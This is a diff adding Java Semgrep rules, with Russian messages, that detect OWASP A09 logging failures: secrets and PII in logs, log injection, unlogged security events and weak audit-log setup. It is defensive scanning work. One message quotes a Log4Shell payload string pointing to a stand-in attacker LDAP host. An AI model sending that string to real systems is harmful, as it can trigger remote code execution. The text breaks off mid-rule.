@@ -1,1 +1,1176 @@
 # A09:2025 – Security Logging & Alerting Failures
+
+rules:
+
+# Логирование чувствительных данных
+
+- id: java-log-password-in-plaintext
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.info("password: {}", $PASSWORD);
+      - pattern: |
+          log.debug("password=" + $PASSWORD);
+      - pattern: |
+          logger.info("Password: " + $PASS);
+      - pattern: |
+          System.out.println("password: " + $PASS);
+  message: |
+    Пароль логируется в открытом виде. Логи часто доступны разработчикам,
+    DevOps, попадают в SIEM, ELK, Splunk — пароль окажется в десятках мест.
+    Никогда не логируйте пароли. Если нужна отладка аутентификации — логируйте
+    только факт попытки без credentials.
+  severity: CRITICAL
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-312
+    owasp: A09:2025 - Security Logging and Alerting Failures
+    references:
+      - https://owasp.org/Top10/A09_2025-Security_Logging_and_Monitoring_Failures/
+
+- id: java-log-token-or-secret
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.debug("token={}", $TOKEN);
+      - pattern: |
+          logger.info("apiKey=" + $API_KEY);
+      - pattern: |
+          log.info("Authorization: " + $HEADER);
+      - pattern: |
+          log.debug("secret: {}", $SECRET);
+      - pattern: |
+          System.out.println("token: " + $TOKEN);
+  message: |
+    Токен авторизации, API ключ или секрет логируется в открытом виде.
+    Bearer-токены и API-ключи в логах позволяют любому с доступом к логам
+    действовать от имени пользователя. Логируйте только маскированные значения
+    (первые 4 + "***") или хеш токена для корреляции.
+  severity: CRITICAL
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-312
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-credit-card-number
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.info("card: {}", $CARD_NUMBER);
+      - pattern: |
+          logger.debug("cardNumber=" + $CARD);
+      - pattern: |
+          log.info("Payment card: " + $PAN);
+  message: |
+    Номер платёжной карты (PAN) попадает в лог. Это прямое нарушение PCI DSS
+    (требование 3.3 и 10). Хранение PAN в логах грозит штрафами и отзывом
+    права работы с картами. Маскируйте до формата ****-****-****-1234
+    перед любым логированием.
+  severity: CRITICAL
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-312
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-personal-data-pii
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.info("user email: {}", $EMAIL);
+      - pattern: |
+          logger.debug("ssn=" + $SSN);
+      - pattern: |
+          log.info("passport: {}", $PASSPORT);
+      - pattern: |
+          log.debug("dateOfBirth={}", $DOB);
+  message: |
+    Персональные данные (email, SSN, паспорт, дата рождения) попадают в логи.
+    Это нарушает GDPR (ст. 5, п. 1f), 152-ФЗ и многие другие регуляторные нормы.
+    Логи с PII требуют особой защиты, ограниченного доступа и политики
+    удаления. Логируйте только анонимизированные идентификаторы (user_id).
+  severity: ERROR
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-312
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-full-http-request-body
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.debug("Request body: {}", $REQ.getBody());
+      - pattern: |
+          log.info("Payload: " + IOUtils.toString($REQ.getInputStream()));
+      - pattern: |
+          logger.debug("request={}", new String($REQ.getInputStream().readAllBytes()));
+  message: |
+    Полное тело HTTP-запроса логируется. Тело запроса может содержать пароли,
+    токены, персональные данные, номера карт. Если нужно логировать запросы
+    для отладки — используйте фильтрацию чувствительных полей (через JSON-
+    фильтр с blacklist полей) и никогда не логируйте тело на уровне WARN/INFO
+    в production.
+  severity: ERROR
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-312
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-user-private-data-object
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.info("user: {}", $USER);
+      - pattern: |
+          logger.debug("User object: " + $USER.toString());
+      - pattern: |
+          log.debug("Entity: {}", $ENTITY);
+  message: |
+    Объект пользователя или entity целиком логируется через toString(). Если
+    в объекте есть поля password, token, creditCard — они попадут в лог.
+    Переопределите toString() с явным исключением чувствительных полей
+    или используйте @JsonIgnore / специализированный DTO для логирования.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-312
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-exception-with-credentials
+  patterns:
+    - pattern-either:
+      - pattern: |
+          } catch ($E $EX) {
+            log.error("Error: " + $EX.getMessage());
+          }
+      - pattern: |
+          } catch (Exception $E) {
+            logger.error("Failed", $E);
+          }
+    - pattern-not-inside: |
+        sanitize($EX.getMessage())
+  message: |
+    getMessage() исключения логируется без санитизации. Сообщения об ошибках
+    часто содержат SQL-запросы с данными, пути к файлам, значения переменных
+    с credentials. Перед логированием фильтруйте сообщения исключений,
+    убирая потенциально чувствительные данные, или логируйте только тип исключения.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-312
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-sql-query-with-values
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.debug("SQL: " + $QUERY);
+      - pattern: |
+          logger.info("Executing query: {}", $SQL);
+      - pattern: |
+          System.out.println("Query: " + $STMT);
+  message: |
+    SQL-запрос с параметрами логируется полностью. Может раскрыть структуру
+    базы, имена таблиц, пользовательские данные (особенно при ошибках вида
+    "WHERE password='plaintext'"). Логируйте только шаблон запроса (с ? вместо
+    значений) или используйте P6Spy с маскированием параметров.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-312
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-private-key-material
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.debug("key: {}", $PRIVATE_KEY);
+      - pattern: |
+          logger.info("privateKey=" + $KEY.getEncoded());
+      - pattern: |
+          log.info("RSA key: {}", Base64.encode($KEY.getEncoded()));
+  message: |
+    Приватный ключ или его материал попадает в лог. Это немедленный компромисс
+    всей криптографической системы. Приватные ключи никогда не должны покидать
+    защищённое хранилище (HSM, Vault) и тем более не должны логироваться.
+  severity: CRITICAL
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-312
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-session-id
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.debug("session: {}", $REQ.getSession().getId());
+      - pattern: |
+          logger.info("sessionId=" + $SESSION.getId());
+      - pattern: |
+          log.info("JSESSIONID: " + $COOKIE.getValue());
+  message: |
+    Идентификатор сессии логируется. Session ID — это фактически токен
+    аутентификации. Любой с доступом к логам может использовать его для
+    Session Hijacking (перехвата сессии). Логируйте только хеш сессии
+    (SHA-256 первых 8 байт) для трассировки без утечки.
+  severity: ERROR
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-312
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+# Log Injection
+
+- id: java-log-injection-crlf
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.info($USER_INPUT);
+      - pattern: |
+          logger.info("Input: " + $REQ.getParameter($PARAM));
+      - pattern: |
+          log.warn("User action: {}", $USER_CONTROLLED);
+    - pattern-not: |
+        log.info($LITERAL);
+  message: |
+    Пользовательский ввод логируется без санитизации. Атакующий может внедрить
+    CRLF-символы (\r\n) и добавить фиктивные лог-записи (например, имитировать
+    успешную аутентификацию). Замените \r\n на пробелы или удалите их:
+    userInput.replaceAll("[\r\n]", "_") перед логированием.
+  severity: MEDIUM
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-117
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-injection-request-param
+  patterns:
+    - pattern-either:
+      - pattern: |
+          logger.info($REQ.getParameter($PARAM));
+      - pattern: |
+          log.debug("param={}", $REQ.getParameter($NAME));
+      - pattern: |
+          log.warn("value: " + request.getParameter($KEY));
+  message: |
+    Request параметр напрямую передаётся в лог без санитизации. Пользователь
+    может передать строку с \n, Tab, ANSI escape-кодами для манипуляции
+    форматом лога. Всегда очищайте пользовательский ввод перед логированием:
+    убирайте переносы строк, нулевые байты, ANSI escape-последовательности.
+  severity: MEDIUM
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-117
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-injection-user-agent
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.info("User-Agent: {}", $REQ.getHeader("User-Agent"));
+      - pattern: |
+          logger.debug("ua=" + request.getHeader("User-Agent"));
+  message: |
+    User-Agent заголовок логируется без очистки. User-Agent полностью под
+    контролем клиента и может содержать CRLF или ANSI escape-коды для
+    инъекции в лог. Санитизируйте перед логированием или логируйте
+    только первые 200 символов с фильтрацией спецсимволов.
+  severity: MEDIUM
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-117
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-injection-referer-header
+  patterns:
+    - pattern: |
+        log.info("Referer: {}", $REQ.getHeader("Referer"));
+    - pattern: |
+        logger.debug("referer=" + $REQ.getHeader("Referer"));
+  message: |
+    Referer заголовок логируется без санитизации. Как и User-Agent, это
+    полностью контролируемое пользователем поле. Санитизируйте перед
+    записью в лог: удалите управляющие символы и ограничьте длину.
+  severity: LOW
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-117
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-injection-log4shell-pattern
+  patterns:
+    - pattern-either:
+      - pattern: |
+          logger.error("Error for: " + $USER_INPUT);
+      - pattern: |
+          log.info("Request from: {}", $REQ.getHeader("X-Forwarded-For"));
+    - pattern-not-inside: |
+        $SANITIZED = $USER_INPUT.replaceAll("[${}]", "");
+  message: |
+    Пользовательский ввод логируется напрямую — потенциальный Log4Shell вектор
+    (CVE-2021-44228). Если используется Log4j 2.x версии < 2.17.1 (уязвимая),
+    строки вида ${jndi:ldap://attacker.com/a} вызовут RCE. Обновите Log4j до
+    2.17.1+, а также всегда санитизируйте ввод перед логированием.
+  severity: CRITICAL
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-117
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-injection-format-string
+  patterns:
+    - pattern-either:
+      - pattern: |
+          String.format($USER_INPUT, $ARGS);
+      - pattern: |
+          String $MSG = String.format("User %s: " + $USER_INPUT, $ID);
+          log.info($MSG);
+  message: |
+    Пользовательский ввод используется как format string. Если формат
+    передаётся в лог, атакующий может внедрить %s, %n для манипуляции
+    логом или вызвать исключение форматирования. Всегда используйте
+    фиксированные строки формата: log.info("msg: {}", userInput).
+  severity: MEDIUM
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-134
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+# Отсутствие логирования security-событий
+
+- id: java-missing-log-on-authentication-failure
+  patterns:
+    - pattern-inside: |
+        @PostMapping("/login")
+        public $RET login(...) { ... }
+    - pattern: |
+        if (!authenticate($USER, $PASS)) {
+          return $RESP.status(401)...;
+        }
+    - pattern-not-inside: |
+        log.warn("Failed login attempt for user: {} from IP: {}", $USER, $IP);
+  message: |
+    Неудачная попытка входа не логируется. Без этих логов невозможно обнаружить
+    brute force, credential stuffing, атаки на конкретные аккаунты. Логируйте:
+    username, IP-адрес, timestamp, user-agent, количество попыток.
+    Используйте уровень WARN для SIEM-алертов.
+  severity: ERROR
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-missing-log-on-successful-login
+  patterns:
+    - pattern-inside: |
+        @PostMapping("/login")
+        public $RET login(...) { ... }
+    - pattern: |
+        if (authenticate($USER, $PASS)) {
+          return $SUCCESS_RESP;
+        }
+    - pattern-not-inside: |
+        log.info("Successful login for user: {} from IP: {}", $USER, $IP);
+  message: |
+    Успешный вход пользователя не логируется. Логирование успешных входов
+    необходимо для audit trail, forensics и обнаружения аномалий (например,
+    вход с нового геолокационного местоположения). Логируйте: user_id, IP,
+    timestamp, тип аутентификации (password/MFA/SSO).
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-missing-log-on-authorization-failure
+  patterns:
+    - pattern-either:
+      - pattern: |
+          throw new AccessDeniedException($MESSAGE);
+      - pattern: |
+          return ResponseEntity.status(403).build();
+      - pattern: |
+          $RESP.sendError(HttpServletResponse.SC_FORBIDDEN);
+    - pattern-not-inside: |
+        log.warn("Access denied for user: {} to resource: {} from IP: {}", ...);
+  message: |
+    Отказ в авторизации (403 Forbidden) не логируется. Серия 403 от одного
+    пользователя — признак попытки эскалации привилегий или сканирования
+    защищённых ресурсов. Логируйте user_id, запрошенный ресурс, IP, метод.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-missing-log-on-account-lockout
+  patterns:
+    - pattern: |
+        user.setLocked(true);
+        userRepository.save($USER);
+    - pattern-not-inside: |
+        log.warn("Account locked for user: {}", $USER.getUsername());
+  message: |
+    Блокировка аккаунта не логируется. Атакующий может массово блокировать
+    аккаунты (DoS) — без логов это не будет обнаружено. Логируйте: username,
+    IP инициировавшего попытки, timestamp, количество попыток.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-missing-log-on-password-change
+  patterns:
+    - pattern: |
+        user.setPassword($ENCODED_NEW_PASS);
+        userRepository.save($USER);
+    - pattern-not-inside: |
+        log.info("Password changed for user: {}", $USER.getUsername());
+  message: |
+    Смена пароля не логируется. Несанкционированная смена пароля —
+    признак компрометации аккаунта. Для forensics и audit важно знать:
+    кто, когда, с какого IP изменил пароль. Логируйте как security event.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-missing-log-on-privilege-escalation
+  patterns:
+    - pattern-either:
+      - pattern: |
+          user.setRole("ADMIN");
+          userRepository.save($USER);
+      - pattern: |
+          roleService.assignRole($USER_ID, "ROLE_ADMIN");
+      - pattern: |
+          $USER.getAuthorities().add(new SimpleGrantedAuthority("ROLE_ADMIN"));
+    - pattern-not-inside: |
+        log.warn("Privilege escalation: user {} granted role {} by {}", ...);
+  message: |
+    Назначение привилегированной роли не логируется. Несанкционированное
+    получение admin-прав — критический инцидент безопасности. Логируйте:
+    кто назначил, кому, какую роль, timestamp, IP. Уровень логирования
+    должен быть WARN или ERROR с алертом в SIEM.
+  severity: ERROR
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-missing-log-on-account-deletion
+  patterns:
+    - pattern-either:
+      - pattern: |
+          userRepository.delete($USER);
+      - pattern: |
+          userRepository.deleteById($ID);
+    - pattern-not-inside: |
+        log.warn("Account deleted: user_id={}, deleted_by={}", $ID, $ACTOR);
+  message: |
+    Удаление аккаунта не логируется. Это критическое необратимое действие,
+    которое обязательно должно быть зафиксировано в audit log с указанием:
+    кто удалил, чей аккаунт, timestamp, причина (если есть).
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-missing-log-on-data-export
+  patterns:
+    - pattern-either:
+      - pattern: |
+          $RESP.getOutputStream().write($BULK_DATA);
+      - pattern: |
+          return ResponseEntity.ok($LIST_OF_USERS);
+      - pattern: |
+          Files.write($PATH, $EXPORTED_DATA);
+    - pattern-not-inside: |
+        log.info("Data export by user: {} records: {} IP: {}", $USER, $COUNT, $IP);
+  message: |
+    Массовая выгрузка данных не логируется. Data exfiltration — одна из самых
+    трудно детектируемых атак. Логируйте каждую выгрузку: пользователь, объём,
+    тип данных, IP, время. Это позволяет обнаружить insider threat и compromised
+    accounts, выгружающих данные.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-missing-log-on-input-validation-failure
+  patterns:
+    - pattern-either:
+      - pattern: |
+          throw new ValidationException($MESSAGE);
+      - pattern: |
+          return ResponseEntity.badRequest().body($ERRORS);
+      - pattern: |
+          $BINDING_RESULT.hasErrors();
+          return "error";
+    - pattern-not-inside: |
+        log.warn("Input validation failed for: {} from IP: {}", $USER, $IP);
+  message: |
+    Ошибки валидации входных данных не логируются. Серия 400/validation errors
+    от одного IP — признак фаззинга, сканирования или попытки инъекции.
+    Логируйте: IP, endpoint, тип ошибки, значение (без PII). Для SIEM
+    важно видеть паттерны аномальных запросов.
+  severity: INFO
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-missing-log-on-token-invalidation
+  patterns:
+    - pattern-either:
+      - pattern: |
+          tokenRepository.delete($TOKEN);
+      - pattern: |
+          tokenBlacklist.add($TOKEN_ID);
+      - pattern: |
+          redisTemplate.delete($JWT_KEY);
+    - pattern-not-inside: |
+        log.info("Token invalidated for user: {} reason: {}", $USER, $REASON);
+  message: |
+    Инвалидация токена (logout, revoke) не логируется. Принудительный logout
+    и отзыв токенов — security-события (могут быть признаком инцидента).
+    Логируйте: user_id, token_id (хеш), причину, IP, timestamp.
+  severity: INFO
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+# Неправильные уровни логирования
+
+- id: java-security-event-logged-as-debug
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.debug("Failed login attempt for user: {}", $USER);
+      - pattern: |
+          logger.debug("Access denied to {}", $RESOURCE);
+      - pattern: |
+          log.trace("Authentication failure: {}", $REASON);
+  message: |
+    Security-событие (ошибка аутентификации, отказ доступа) логируется на
+    уровне DEBUG или TRACE. В production DEBUG/TRACE обычно отключён,
+    и события теряются. Используйте WARN или ERROR для security-событий —
+    они должны быть видны в production и попадать в SIEM.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-critical-event-logged-as-info
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.info("Account locked: {}", $USER);
+      - pattern: |
+          logger.info("SQL Injection attempt detected from IP: {}", $IP);
+      - pattern: |
+          log.info("Privilege escalation attempt by {}", $USER);
+  message: |
+    Критическое security-событие (блокировка, атака, эскалация) логируется
+    на уровне INFO. Для корреляции в SIEM и автоматических алертов критические
+    события должны использовать WARN или ERROR. Настройте SIEM на алерт
+    при WARN+ с security-тегом.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-exception-swallowed-without-logging
+  patterns:
+    - pattern-either:
+      - pattern: |
+          } catch ($EX $E) {
+          }
+      - pattern: |
+          } catch (Exception $E) {
+            // ignore
+          }
+      - pattern: |
+          } catch ($EX $E) {
+            return null;
+          }
+  message: |
+    Исключение поглощается без логирования. Если это security-исключение
+    (AuthenticationException, AccessDeniedException, CryptoException) —
+    инцидент пройдёт незамеченным. Всегда логируйте пойманные исключения
+    минимум на уровне WARN с контекстом (откуда, что, когда).
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-sysout-instead-of-logger
+  patterns:
+    - pattern-either:
+      - pattern: |
+          System.out.println($MSG);
+      - pattern: |
+          System.err.println($MSG);
+      - pattern: |
+          e.printStackTrace();
+  message: |
+    Используется System.out/System.err вместо logger. В production это:
+    не структурировано, не управляется уровнями, не попадает в log aggregator,
+    не доступно SIEM, не имеет timestamp/thread/context. Замените на
+    SLF4J/Logback/Log4j2 с правильной конфигурацией аппендеров.
+  severity: INFO
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-security-exception-message-only
+  patterns:
+    - pattern-either:
+      - pattern: |
+          } catch (SecurityException $E) {
+            log.error($E.getMessage());
+          }
+      - pattern: |
+          } catch (AuthenticationException $E) {
+            logger.warn($E.getMessage());
+          }
+  message: |
+    При перехвате security-исключения логируется только message без stacktrace.
+    Для forensics и расследования инцидентов важен полный stack trace.
+    Используйте log.error("Security error", e) — это запишет и message,
+    и полный stacktrace.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+# Audit Log — целостность и полнота
+
+- id: java-audit-log-without-user-context
+  patterns:
+    - pattern-either:
+      - pattern: |
+          auditLog.save(new AuditEntry($ACTION, $RESOURCE));
+      - pattern: |
+          auditRepository.save(AuditEntry.builder()
+            .action($ACTION)
+            .resource($RESOURCE)
+            .build());
+    - pattern-not-inside: |
+        .userId($USER_ID)
+    - pattern-not-inside: |
+        .performedBy($USER)
+  message: |
+    Запись в audit log создаётся без идентификатора пользователя, совершившего
+    действие. Audit log без атрибуции не имеет смысла для расследования
+    инцидентов. Всегда включайте: user_id, session_id, IP, timestamp,
+    action, affected_resource, result (success/failure).
+  severity: ERROR
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-audit-log-without-timestamp
+  patterns:
+    - pattern: |
+        AuditEntry $ENTRY = new AuditEntry();
+        $ENTRY.setUserId($USER_ID);
+        $ENTRY.setAction($ACTION);
+        auditRepository.save($ENTRY);
+    - pattern-not-inside: |
+        $ENTRY.setTimestamp(...);
+    - pattern-not-inside: |
+        $ENTRY.setCreatedAt(...);
+  message: |
+    Audit log запись сохраняется без явного timestamp. Если timestamp не
+    устанавливается в коде, он может отсутствовать или устанавливаться
+    некорректно (время БД vs время события). Всегда явно устанавливайте
+    Instant.now() в момент события, до любых async операций.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-audit-log-without-ip-address
+  patterns:
+    - pattern: |
+        auditLog.log($USER_ID, $ACTION, $RESOURCE);
+    - pattern-not-inside: |
+        auditLog.log($USER_ID, $ACTION, $RESOURCE, $IP);
+    - pattern-not-inside: |
+        .ipAddress($IP)
+  message: |
+    Audit log не фиксирует IP-адрес клиента. IP-адрес критичен для:
+    корреляции событий, геолокации аномалий, forensics. Передавайте IP
+    из X-Forwarded-For (с валидацией) или RemoteAddr в каждую audit-запись.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-audit-log-stored-in-same-db
+  patterns:
+    - pattern: |
+        @Entity
+        @Table(name = "audit_log")
+        class AuditLog { ... }
+    - pattern-not-inside: |
+        @SecondaryTable(name = "audit_log", schema = $AUDIT_SCHEMA)
+  message: |
+    Audit log хранится в той же схеме/БД, что и основные данные. Если атакующий
+    получает доступ к БД, он может удалить следы своих действий из audit log.
+    Audit log должен храниться в отдельном защищённом хранилище с append-only
+    правами для приложения (запись, но не удаление и не обновление).
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-audit-log-can-be-deleted
+  patterns:
+    - pattern-either:
+      - pattern: |
+          auditRepository.deleteAll();
+      - pattern: |
+          auditRepository.deleteById($ID);
+      - pattern: |
+          jdbcTemplate.update("DELETE FROM audit_log WHERE ...");
+  message: |
+    В коде присутствует возможность удалить записи audit log. Атакующий
+    с доступом к приложению или БД может уничтожить следы. Audit log должен
+    быть append-only. Реализуйте архивирование вместо удаления, или используйте
+    отдельный write-only сервис (WORM-хранилище, Kafka с retention policy).
+  severity: ERROR
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-audit-log-without-correlation-id
+  patterns:
+    - pattern: |
+        auditLog.record($USER_ID, $ACTION, $RESOURCE, $IP, $TIMESTAMP);
+    - pattern-not-inside: |
+        .correlationId($CORRELATION_ID)
+    - pattern-not-inside: |
+        .requestId($REQUEST_ID)
+  message: |
+    Audit log не содержит correlation/request ID для трассировки запросов
+    через микросервисы. При расследовании инцидента невозможно связать цепочку
+    действий из разных сервисов. Добавляйте MDC.put("correlationId", id)
+    и включайте его в каждую audit-запись.
+  severity: INFO
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+# Алертинг и мониторинг
+
+- id: java-rate-limit-exceeded-no-alert
+  patterns:
+    - pattern: |
+        if (rateLimiter.isBlocked($KEY)) {
+          throw new TooManyRequestsException($MSG);
+        }
+    - pattern-not-inside: |
+        log.warn("Rate limit exceeded for: {} IP: {}", $KEY, $IP);
+  message: |
+    Rate limit срабатывает, но событие не логируется. Серия превышений лимита —
+    признак DDoS, brute force или credential stuffing. Логируйте каждое
+    превышение с контекстом (IP, endpoint, user) для SIEM-алертов и
+    автоматической блокировки.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-security-event-no-metrics
+  patterns:
+    - pattern-either:
+      - pattern: |
+          log.warn("Failed login attempt for user: {}", $USER);
+      - pattern: |
+          log.warn("Access denied for: {}", $USER);
+    - pattern-not-inside: |
+        meterRegistry.counter("security.failed_logins").increment();
+    - pattern-not-inside: |
+        Counter.builder("security.events").tag(...).register(...).increment();
+  message: |
+    Security-событие логируется, но не отражается в метриках (Prometheus/Micrometer).
+    Без метрик невозможно настроить алерты в Grafana/Alertmanager на аномальные
+    паттерны (100+ failed logins за минуту). Добавьте счётчики метрик для
+    всех security-событий для real-time мониторинга.
+  severity: INFO
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-no-logging-in-filter-chain
+  patterns:
+    - pattern-inside: |
+        @Component
+        class $FILTER implements Filter { ... }
+    - pattern: |
+        public void doFilter($REQUEST, $RESPONSE, $CHAIN) {
+          ...
+          $CHAIN.doFilter($REQUEST, $RESPONSE);
+        }
+    - pattern-not-inside: |
+        log.$LEVEL(...);
+  message: |
+    Servlet Filter не содержит никакого логирования. Security filters
+    (аутентификация, rate limiting, CORS) должны логировать факты блокировки,
+    ошибки и аномалии. Без логирования в фильтрах security-события теряются
+    до попадания в бизнес-логику.
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-scheduled-security-job-no-logging
+  patterns:
+    - pattern-inside: |
+        @Scheduled(...)
+        public void $METHOD() { ... }
+    - pattern-not-inside: |
+        log.$LEVEL(...);
+  message: |
+    Scheduled job не содержит логирования. Если scheduled job занимается
+    security-задачами (очистка токенов, проверка integrity, ротация ключей),
+    его выполнение, успех и ошибки должны логироваться. Молчащий scheduled
+    job невозможно мониторить.
+  severity: INFO
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+# Конфигурация логирования
+
+- id: java-logging-disabled-globally
+  patterns:
+    - pattern-either:
+      - pattern: |
+          logging.level.root=OFF
+      - pattern: |
+          logging.level.root=ERROR
+      - pattern: |
+          <root level="OFF">
+  message: |
+    Логирование отключено или установлено на ERROR для корневого логгера.
+    Это означает потерю всех WARN-уровневых security-событий (failed logins,
+    access denied, rate limiting). В production минимальный уровень корневого
+    логгера должен быть WARN, для security-пакетов — INFO или WARN.
+  severity: ERROR
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-security-package-logging-disabled
+  patterns:
+    - pattern-either:
+      - pattern: |
+          logging.level.org.springframework.security=OFF
+      - pattern: |
+          <logger name="org.springframework.security" level="OFF"/>
+      - pattern: |
+          logging.level.org.springframework.security=ERROR
+  message: |
+    Логирование Spring Security отключено или установлено на ERROR. Spring
+    Security логирует попытки входа, решения об авторизации, ошибки конфигурации.
+    Эти логи критичны для security мониторинга. Установите минимум WARN для
+    пакета org.springframework.security.
+  severity: ERROR
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-file-no-rotation
+  patterns:
+    - pattern-either:
+      - pattern: |
+          logging.file.name=app.log
+      - pattern: |
+          <appender name="FILE" class="ch.qos.logback.core.FileAppender">
+    - pattern-not-either:
+      - pattern: |
+          logging.logback.rollingpolicy.max-file-size=
+      - pattern: |
+          <rollingPolicy class=
+  message: |
+    Лог-файл без политики ротации. При достаточной нагрузке лог заполнит диск
+    (DoS), а также старые security-события будут перезаписаны. Настройте
+    RollingFileAppender с временной и размерной политикой ротации и явным
+    retention (минимум 90 дней для security логов, PCI DSS требует 1 год).
+  severity: WARNING
+  languages: [java]
+  meta:
+    category: security
+    cwe: CWE-778
+    owasp: A09:2025 - Security Logging and Alerting Failures
+
+- id: java-log-async-without-never-block
+  patterns:
+    - pattern-either:
+      - pattern: |
+          <appender name="ASYNC" class="ch.qos.logback.classic.AsyncAppender">
+              <discardingThreshold>20</discardingThreshold>
+      - pattern: |
+          <discardingThreshold>0</discardingThreshold>
+    - pattern-not-inside: |
+        <neverBlock>false</neverBlock>
+  message: |
+    AsyncAppender сконфигурирован с discardingThreshold > 0 — при заполнении
